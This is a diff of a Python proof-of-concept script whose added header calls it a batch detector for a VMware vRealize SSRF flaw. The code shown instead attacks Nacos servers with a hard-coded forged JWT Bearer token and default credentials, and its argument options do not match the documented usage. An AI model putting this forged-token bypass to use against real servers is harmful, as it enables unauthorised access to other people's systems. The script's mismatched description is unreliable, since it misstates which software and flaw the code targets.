@@ -2,10 +2,20 @@ import argparse
 import requests
 import threading
 
+'''
++-----------------------------------------------------------------+
+漏洞名称:VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975  
+功能：基于dnslog回显进行检测，单个检测，批量检测                                     
+单个检测：python poc.py -u url -d domain
+批量检测：python poc.py -f 1.txt
++-----------------------------------------------------------------+                                     
+'''
+
 # 伪造用户登录时的请求头和请求数据
 headers = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
-    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA4MTkwNzk5M30.BdQSxmoftt9zePaqO1-B9QFSi1tsiiQ2mzKUjnZfQJk"}
+    "User-Agent": "Firefox/124.0",
+    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA4"
+                     "MTkwNzk5M30.BdQSxmoftt9zePaqO1-B9QFSi1tsiiQ2mzKUjnZfQJk"}
 
 data = {"username": "nacos", "password": "nacos123"}
 
@@ -30,9 +40,18 @@ def send_request(url):
 
 
 if __name__ == '__main__':
+
     parser = argparse.ArgumentParser()
-    parser.add_argument('-u', '--url', type=str, default=None, help='nacos地址')
-    parser.add_argument('-p', '--path', type=str, default=None, help='nacos地址列表(.txt)')
+    parser.add_argument('-u',
+                        '--url',
+                        type=str,
+                        default=None,
+                        help='目标地址，带上http(s)://')
+    parser.add_argument('-p',
+                        '--path',
+                        type=str,
+                        default=None,
+                        help='批量检测，带上http(s)://')
     args = parser.parse_args()
 
     if args.url:
